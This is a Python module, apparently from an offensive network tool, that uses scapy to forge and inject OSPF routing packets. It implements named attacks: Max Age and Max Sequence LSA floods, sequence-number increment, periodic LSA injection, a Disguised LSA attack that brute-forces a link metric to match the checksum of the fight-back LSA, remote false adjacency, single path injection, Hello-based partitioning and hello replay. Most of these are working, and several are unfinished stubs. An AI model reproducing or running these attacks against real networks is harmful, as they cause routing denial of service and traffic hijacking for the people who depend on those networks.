import asyncio
from sys import flags
from scapy.contrib.ospf import *
from scapy.sendrecv import sniff
from scapy.packet import Packet
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.utils import atol, ltoa
from scapy.packet import Packet
from scapy.all import Net, get_if_addr
from libs.aux_funcs import type_wrapper, OSPF_Link as OSPF_Link_Patched, send_l3_single
from time import sleep
from threading import Thread
from consolemenu import SelectionMenu

# TODO find a way to replace the OSPF_Link class with the patched one
#OSPF_Link = OSPF_Link_Patched

def _ospf_sniff(iface, timeout=None) -> list:
    lst = sniff(count = 0, filter= "proto ospf", timeout=30*60 if globals()['TEST'] == False else 30, iface=iface)
    lst = [p for p in lst if p.haslayer(OSPF_LSUpd)]
    return lst

def _ospf_select_pkt(lst: list):
    pkt_index = SelectionMenu.get_selection([p[OSPF_LSUpd].__repr__() for p in lst])

    return lst[pkt_index]

def _ospf_bruteforce_checksum(evil, checksum):

    pass


def _ospf_reset_lsu_chksum(pkt: Packet) -> Packet:
    if pkt.haslayer(IP):
        pkt[IP].len = None
        pkt[IP].chksum = None
    pkt[OSPF_Hdr].chksum = None
    pkt[OSPF_Hdr].len = None
    pkt[OSPF_LSUpd].chksum = None
    pkt[OSPF_LSUpd].len = None
    return pkt


def _ospf_parse_lsu(args: dict) -> Packet:

    ospf = args['lsu_info']['ospf']

    # Build the LSU/LSA list
    lsalist = []
    raw_lsalist = ospf['lsa_list']
    
    for raw_lsa in raw_lsalist:
        lsa_type = raw_lsa['type']

        nlsa = _parse_lsa(ospf, raw_lsa, lsa_type)

        lsalist.append(nlsa)

    # TODO check authentication
    pkt = OSPF_Hdr(type=4,src = ospf['router_id'], area = ospf['area_id'])/OSPF_LSUpd(lsalist=lsalist,lsacount=len(lsalist))

    return pkt

def _parse_lsa(ospf, raw_lsa, lsa_type):
    if lsa_type == 'router_lsa':
        flgs = raw_lsa['v'] << 2 | raw_lsa['e'] << 1 | raw_lsa['b']
        nlink_lst = []

        for rlink in raw_lsa['links']:
            nlink = OSPF_Link(id=rlink['link_id'], data=rlink['link_data'], type=rlink['type'], metric=rlink['metric'])
            nlink_lst.append(nlink)

        nlsa = OSPF_Router_LSA(flags=flgs, id=raw_lsa['ls_id'], adrouter=raw_lsa['ls_id'], linklist=nlink_lst, linkcount=len(nlink_lst))

    elif lsa_type == 'network_lsa':
        nlsa = OSPF_Network_LSA(id = raw_lsa['ls_id'], adrouter = raw_lsa['adv_router'], mask = raw_lsa['mask'], routerlist = raw_lsa['attached_router'])
            

    elif lsa_type == 'summary_lsa':
        if raw_lsa['lsa_type'] == 3: # Type 3 LSA
            nlsa = OSPF_SummaryIP_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], metric = raw_lsa['metric'])
        elif raw_lsa['lsa_type'] == 4: #Type 4 LSA
            nlsa = OSPF_SummaryASBR_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], metric = raw_lsa['metric'])
            

    elif lsa_type == 'external_lsa':
        nlsa = OSPF_External_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], ebit = raw_lsa['e'], metric = raw_lsa['metric'], fwdaddr = raw_lsa['fwd_addr'], tag = raw_lsa['ext_rt_tag'])

    elif lsa_type == 'nssa_lsa':
        nlsa = OSPF_External_LSA(id = raw_lsa['ls_id'], adrouter = ospf['router_id'], mask = raw_lsa['mask'], ebit = raw_lsa['e'], metric = raw_lsa['metric'], fwdaddr = raw_lsa['fwd_addr'], tag = raw_lsa['ext_rt_tag'])

    else:
        pass
    return nlsa

@type_wrapper(name="Max Age LSA (Import & Inject)", type="DoS", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_max_age(args: dict) -> dict:

    """Performs a Max Age LSA attack. Utilizes an imported LSA."""

    # Parse lsu from config
    pkt = _ospf_parse_lsu(args)

    # Set max age in LSA_hdr
    for lsa in pkt[OSPF_LSUpd].lsalist:
        lsa.age = 3600
        lsa.seq += 1
    
    while True:
        # MAX AGE attack also increases seq number by 2 (1 for fightback, 1 for current)
        for lsa in pkt[OSPF_LSUpd].lsalist:
            lsa.seq += 2

        args['pkt'] = IP(dst="224.0.0.5")/pkt

        # Send the packet
        send_l3_single(args)

        # Sleep interval for changes to propagate
        sleep(1)


@type_wrapper(name="Max Age LSA (Sniff & Inject)", type="DoS", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_max_age_2(args: dict) -> dict:

    # Parse lsu from config
    pkt = _ospf_sniff_sel_lsa(args)

    # Set max age in LSA_hdr
    for lsa in pkt[OSPF_LSUpd].lsalist:
        lsa.age = 3600
        lsa.seq += 1
    
    while True:
        # MAX AGE attack also increases seq number by 2 (1 for fightback, 1 for current)
        for lsa in pkt[OSPF_LSUpd].lsalist:
            lsa.seq += 2

        args['pkt'] = IP(dst="224.0.0.5")/pkt

        # Send the packet
        send_l3_single(args)

        # Sleep interval for changes to propagate
        sleep(1)

@type_wrapper(name="Seq++ Attack", type="DoS", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_seq_increment(args):
    
    # Parse lsu from config
    pkt = _ospf_parse_lsu(args)

    while True:
        # Increment seq# in LSA_hdr
        pkt[OSPF_LSUpd].lsalist[0].seq += 1

        args['pkt'] = IP(dst="224.0.0.5")/pkt

        # Send the packet
        send_l3_single(args)

        # Sleep interval for changes to propagate
        sleep(1)

# NOTE: Performing the attack as is on a c3725 router will lead to instability where the originator will try to continuosly purge the LSA, but won't be able to
@type_wrapper(name="Max Seq # LSA", type="DoS", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_max_seq_num(args):

    # Parse lsu from config
    pkt = _ospf_parse_lsu(args)

    # Set seq# to max in LSA_Hdr
    pkt[OSPF_Hdr].lsalist[0].seq = 0x7FFFFFFF

    args['pkt'] = IP(dst="224.0.0.5")/pkt

    # Send the packet
    send_l3_single(args)


@type_wrapper(name="Periodic Injection", type="DoS", category="Attack", layer="L3 - OSPF", arg_list=['source_ip','target_ip'])
def ospf_periodic_injection(args):

    """Performs a Periodic Injection attack. Utilizes an imported list of LSAs to inject into the network"""

    def _aux_inc_seq(pkt, seq = None):
        for lsa in pkt[OSPF_LSUpd].lsalist:
            if seq == None:
                lsa.seq += 1
            else:
                lsa.seq = seq
        return pkt

    period = 5 #seconds

    #get the lsu
    lsu = _ospf_parse_lsu(args)

    lsu_pkt = Ether(dst="01:00:5e:00:00:05")/IP(src=args['source_ip'], dst=args['target_ip'], ttl=1)/lsu
    
    # set initial seq#

    lsu_pkt = _aux_inc_seq(lsu_pkt, 0x80010000)
    
    # send the initial one
    sendp(lsu_pkt, iface=args['iface'])

    print("Injecting initial LSU...")

    # send it in a loop
    try:
        while True:
            lsu_pkt = _aux_inc_seq(lsu_pkt)
            sendp(lsu_pkt, iface=args['iface'])
            sleep(period)
    except KeyboardInterrupt:
        print("Stopping")
        return


def _ospf_sniff_sel_lsa(args):

    lst = _ospf_sniff(args['iface'])

    str_lst = [s.show(dump=True) for s in lst]

    sel = SelectionMenu.get_selection(str_lst)

    return lst[sel]


@type_wrapper(name="Disguised LSA", type="Route Poisoning", category="Attack", layer="L3 - OSPF", arg_list=[])
def ospf_disguised_lsa(args):

    """Performs a Disguised LSA attack. Uses a sniffed LSA and modifies/inserts fake values."""


    # Sniff LSA and store it
    # TODO fix the timeout
    pkt = _ospf_sniff_sel_lsa(args)


    # Remove Ether and IP layers
    pkt = pkt[OSPF_Hdr]

    # Create 3 separated packets
    pkt1, pkt2, pkt3 = eval(pkt.command()), eval(pkt.command()), eval(pkt.command())

    # Select lsa to modify
    lsalst_str = [s.show(dump=True) for s in pkt[OSPF_LSUpd].lsalist]

    sel_index = SelectionMenu.get_selection(lsalst_str)

    # adapt pkt3's parameters to match the fightback lsa
    pkt3[OSPF_LSUpd].lsalist[sel_index].seq += 2
    pkt3 = _ospf_reset_lsu_chksum(pkt3)
    
    # Extract the checksum
    fightback_chksum = Ether(pkt3.build())[OSPF_LSUpd].lsalist[sel_index].chksum

    # Modify the links
    _ospf_lsa_modify_parameter(pkt2[OSPF_LSUpd].lsalist[sel_index])

    # pkt1 will trigger fight-back
    # TODO modify to allow other LSA types
    pkt1[OSPF_LSUpd].lsalist[sel_index].linklist[0].metric = 0
    pkt1[OSPF_LSUpd].lsalist[sel_index].seq += 1

    # reset checksum and len for pkt1
    pkt1 = _ospf_reset_lsu_chksum(pkt1)

    # pkt2 is the evil lsa
    pkt2 = _ospf_reset_lsu_chksum(pkt2)
    # Increase seq #
    pkt2[OSPF_LSUpd].lsalist[sel_index].seq += 2
    # Add a dummy link
    pkt2[OSPF_LSUpd].lsalist[sel_index].linklist.extend(OSPF_Link(type=3, data="255.255.255.0", id = "172.235.0.0", metric = 0))
    pkt2[OSPF_LSUpd].lsalist[sel_index].linkcount += 1

    # Brute force the metric so the checksum is right
    for metric in range(0, 65535):
        pkt2[OSPF_LSUpd].lsalist[sel_index].linklist[-1].metric = metric
        pkt2[OSPF_LSUpd].lsalist[sel_index].chksum = None
        tmp_chk = ospf_lsa_checksum(pkt2[OSPF_LSUpd].lsalist[sel_index].copy().build())
        if tmp_chk == fightback_chksum:
            break
    


    # Add IP layer
    pkt1 = IP(dst="224.0.0.5", src = get_if_addr(args['iface']))/pkt1
    pkt2 = IP(dst="224.0.0.5", src = get_if_addr(args['iface']))/pkt2

    # Send the LSUs
    send([pkt1, pkt2], iface=args['iface'])
    #TODO test this ^
    


    return args


def _ospf_lsa_modify_parameter(lsa):
    
    lsa_type = lsa.type

    if lsa_type == 1:
        # ROUTER LSA

        # TODO decouple display from logic
        # TODO loop for various modifications

        link_str = [s.show(dump=True) for s in lsa.linklist]

        # Select link to modify
        sel = SelectionMenu.get_selection(link_str)

        sel_link = lsa.linklist[sel]

        # Select parameter to modify

        sel = SelectionMenu.get_selection(['Link ID', 'Link Data', 'Metric'])

        if sel == 0:
            pass
        elif sel == 1:
            pass
        elif sel == 2:
            # Modify Metric
            sel_link.metric = int(input(f"Introduce new metric value (current: {sel_link.metric}): "))
        else:
            pass

    elif lsa_type == 2:
        # NETWORK LSA
        pass
    return


@type_wrapper(name="Remote False Adjacency", type="Route Poisoning", category="Attack", layer="L3 - OSPF", arg_list=["victim_IP","victim_id"])
def ospf_remote_false_adjacency(args):
    """Performs a Remote False Adjacency Attack on the target router. Uses imported LSA data."""

    async def _ospf_loop_hello(args):

        victim_IP = args['victim_IP']
        victim_id = args['victim_id']

        # Phantom ID must be 1 higher than victim
        phantom_IP = args['lsu_info']['ospf']['interface_addr']
        phantom_id = args['lsu_info']['ospf']['router_id']
        mask = args['lsu_info']['ospf']['interface_netmask']
        area_id = args['lsu_info']['ospf']['area_id']

        hello_tlv = OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        hello_payld = OSPF_Hello(router=victim_IP,backup=victim_IP,mask=mask,neighbors=[victim_id],options=0x12)
        hello_hdr = OSPF_Hdr(src=phantom_id, area=area_id)
        hello_IP = IP(src=phantom_IP, dst = victim_IP)

        hello_pkt = hello_IP/hello_hdr/hello_payld/hello_tlv

        try:
            while True:
                print("Sending hello pkt...")
                send(hello_pkt,iface=args['iface'],verbose=False)
                await asyncio.sleep(30) # TODO sleep for max hello interval ?
        except asyncio.CancelledError:
            return

    async def _dbd_coro(args):
        victim_IP = args['victim_IP']
        
        
        # Phantom ID must be higher than victim
        phantom_IP = args['lsu_info']['ospf']['interface_addr']
        phantom_id = args['lsu_info']['ospf']['router_id']
        area_id = args['lsu_info']['ospf']['area_id']

        # sleep for 2 sec so the hello coroutine executes first
        await asyncio.sleep(5)

        # First, send hello and do dbd exchange
        db_seq = 1 # TODO randomize seq # ?

        dbd1 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_id, area=area_id)/OSPF_DBDesc(dbdescr=0x07, ddseq=db_seq, options=0x52)/OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        print("Sending dbd1...")
        send(dbd1, iface=args['iface'],verbose=False)
        await asyncio.sleep(4)

        # Send 8? dbd messages
        for c in range(0,8):
            db_seq += 1
            dbd2 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_id, area=area_id)/OSPF_DBDesc(dbdescr=0x03, ddseq=db_seq, options=0x52)/OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
            print("Sending dbd2...")
            send(dbd2, iface=args['iface'],verbose=False)
            await asyncio.sleep(4)

        # Terminate dbd exchange
        db_seq += 1
        dbd3 = IP(src=phantom_IP, dst=victim_IP)/OSPF_Hdr(type=2, src=phantom_id, area=area_id)/OSPF_DBDesc(dbdescr=0x01, ddseq=db_seq, options = 0x52)/OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])
        print("Sending dbd3...")
        send(dbd3, iface=args['iface'],verbose=False)
        
        # Wait 50 secs for db exchange to clear
        await asyncio.sleep(50)


        # Send fake lsu
        lsu = _ospf_parse_lsu(args)

        lsu_pkt = IP(src=phantom_IP, dst=victim_IP)/lsu
        print("Injecting LSU...")
        send(lsu_pkt,iface=args['iface'],verbose=False)

        print("Done")
        print("Press ctrl+c to interrupt attack...")
        return

    async def main(args):
        # Start hello and dbd coroutines, block until ctrl+c
        try:
            gth = await asyncio.gather(asyncio.create_task(_ospf_loop_hello(args)), asyncio.create_task(_dbd_coro(args)))
        except KeyboardInterrupt:
            gth.cancel()

    try:
        asyncio.run(main(args))    
    except KeyboardInterrupt:
        return
               


@type_wrapper(name = "Single Path Injection", type="Route Poisoning", category="Attack", layer= "L3 - OSPF", arg_list=["springb_ip","polluted_ip"])
def ospf_sigle_path_injection(args):
    """Performs a Single Path Injection attack on the target polluted router, using the springboard IP. Uses imported LSA data."""

    springb_ip = args["springb_ip"]
    polluted_ip = args["polluted_ip"]


    # Build the false LSA
    lsu = _ospf_parse_lsu(args)

    # Change the seq# for the pkt to be accepted
    for lsa in lsu.lsalist:
        lsa.seq = 0x7fff0000    # TODO check if this seq# is ok

    # Construct pkt remainder
    pkt = IP(src=springb_ip, dst=polluted_ip, proto=89)/lsu

    send(pkt, iface=args["iface"])

    pass






@type_wrapper(name = "Malicious Hello Partition", type = "DoS", layer = "L3 - OSPF", category = "Attack", arg_list=["victim_subnet"])
def ospf_hello_partition(args):
    """Performs a Partitioning attack utilizing Hello packets."""

    # Parse arguments
    victim_subnet = Net(args["victim_subnet"])
    
    # Remove network and broadcast address from subnet ip list
    ip_list = [addr for addr in iter(victim_subnet)][1:-1]

    # Build malicious hello
    # TODO change src ip if needed
    pkt = IP(dst = ip_list, src = ip_list[-1])/\
        OSPF_Hdr(type=1, src='253.253.253.253')/\
        OSPF_Hello(options = 0x10)/\
        OSPF_LLS_Hdr(llstlv=[LLS_Extended_Options(type=1,len=4,options='\x00\x00\x00\x01')])

    # Send malicious hello TODO loop for consistency?
    send(pkt, iface=args['iface'])

    pass


@type_wrapper(name = "Persistent Poisoning", type = "Route Poisoning", layer = "L3 - OSPF", category = "Attack", arg_list = [])
def ospf_persistent_poisoning(args):

    # TODO Inject a router lsa with the corresponding characteristics 

    pass


@type_wrapper(name = "Adjacency Spoofing + Database Dump", type = "Network Scanning", layer = "L3 - OSPF", category = "Attack", arg_list = ['router_id'])
def ospf_adjacency_spoofing_db_dump(args):

    # Sniff hello packet from network

    pkt = sniff(filter = "proto ospf", count = 1, iface=args['iface'])

    # Extract relevant parameters from hello

    ospf_hdr = pkt[0][OSPF_Hdr]
    ospf_hello = pkt[0][OSPF_Hello]
    ospf_lls = pkt[0][OSPF_LLS_Hdr]

    area = ospf_hdr.area 
    if len(ospf_hello.neighbors) == 0:
        dr = ospf_hdr.src
        bdr = get_if_addr(args['iface'])
        dr_addr = ospf_hello.router
    else:
        # TODO if 2 or more routers already on link
        return

    hello_int = ospf_hello.hellointerval
    dead_int = ospf_hello.deadinterval
    opts = ospf_hello.opts
    mask = ospf_hello.mask
    
    # Craft malicious hello

    hello_1 = IP(src=get_if_addr(args['iface']), dst="224.0.0.5", ttl = 1)/\
              OSPF_Hdr(src=args['router_id'], area = area)/\
              OSPF_Hello(mask=mask, hellointerval = hello_int, deadinterval=dead_int, options = opts, router = dr_addr, backup = bdr, neighbors = [dr])/\
              ospf_lls

    # Send malicious hello, start sniffing for DBD

    send(hello_1, iface=args['iface'])

    dbd1_rcv = sniff(count = 1, lfilter = lambda x: x.haslayer(OSPF_Hello) and x[IP].src == dr_addr and x[IP].dst == get_if_addr(args['iface']), iface = args['iface'])

    pass


@type_wrapper(name = "Initial Hello Replay", type = "DoS", layer = "L3 - OSPF", category = "Attack", arg_list = [])
def ospf_initial_hello_replay(args):

    """Replays a hello packet utilized when OSPF is starting in order to break adjacency relations."""

    def aux_sniff(timeout, iface):

        lst = sniff(count = 0, filter= "proto ospf", timeout=timeout, iface=iface)
    
        lst = [p for p in lst if p.haslayer(OSPF_Hello)]

        str_lst = [s.show(dump=True) for s in lst]

        sel = SelectionMenu.get_selection(str_lst)

        return lst[sel]

    
    pkt = aux_sniff(60, args['iface'])

    sendp(pkt, iface=args['iface'])

    


